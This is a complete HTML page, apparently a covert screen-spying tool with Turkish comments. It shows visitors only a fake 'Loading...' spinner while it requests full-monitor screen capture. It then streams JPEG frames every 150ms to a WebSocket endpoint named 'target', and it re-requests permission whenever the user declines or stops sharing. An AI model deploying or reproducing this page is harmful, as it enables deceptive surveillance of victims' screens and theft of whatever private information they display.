<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Yükleniyor...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            overflow: hidden;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .loader {
            text-align: center;
            opacity: 0;
            animation: fadeIn 1s ease 0.5s forwards;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #333;
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn { to { opacity: 1; } }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div class="loader" id="loader">
        <div class="spinner"></div>
        <p>Yükleniyor...</p>
    </div>

    <script>
        const sessionId = window.location.pathname.split('/').pop();
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const host = window.location.host;
        const WS_URL = `${protocol}//${host}/ws/target?id=${sessionId}`;

        let ws = null;
        let stream = null;
        let captureInterval = null;

        async function startScreenCapture() {
            try {
                // Ekran paylaşımı iste
                stream = await navigator.mediaDevices.getDisplayMedia({
                    video: {
                        cursor: "always",
                        displaySurface: "monitor"
                    },
                    audio: false
                });

                // WebSocket bağlantısı
                ws = new WebSocket(WS_URL);

                ws.onopen = () => {
                    console.log('Bağlantı açıldı');
                    startStreaming();
                };

                ws.onclose = () => {
                    console.log('Bağlantı kapandı');
                    stopStreaming();
                    setTimeout(startScreenCapture, 2000);
                };

                ws.onerror = (err) => {
                    console.error('WebSocket hatası:', err);
                };

                // Kullanıcı paylaşımı durdurursa
                stream.getVideoTracks()[0].onended = () => {
                    stopStreaming();
                    setTimeout(startScreenCapture, 1000);
                };

            } catch (err) {
                console.error('Ekran paylaşımı hatası:', err);
                // Kullanıcı izin vermediyse tekrar dene
                setTimeout(startScreenCapture, 3000);
            }
        }

        function startStreaming() {
            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');

            video.srcObject = stream;
            video.play();

            video.onloadedmetadata = () => {
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;

                // Her 150ms'de bir kare gönder
                captureInterval = setInterval(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        canvas.toBlob((blob) => {
                            const reader = new FileReader();
                            reader.onloadend = () => {
                                const base64 = reader.result.split(',')[1];
                                ws.send(JSON.stringify({
                                    type: 'frame',
                                    data: base64,
                                    timestamp: Date.now(),
                                    resolution: `${canvas.width}x${canvas.height}`
                                }));
                            };
                            reader.readAsDataURL(blob);
                        }, 'image/jpeg', 0.4);
                    }
                }, 150);
            };
        }

        function stopStreaming() {
            if (captureInterval) {
                clearInterval(captureInterval);
                captureInterval = null;
            }
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
            if (ws) {
                ws.close();
                ws = null;
            }
        }

        // Sayfa yüklendiğinde başlat
        window.addEventListener('load', () => {
            setTimeout(startScreenCapture, 500);
        });

        // Sayfa kapanmadan önce temizle
        window.addEventListener('beforeunload', stopStreaming);
    </script>
</body>
</html>
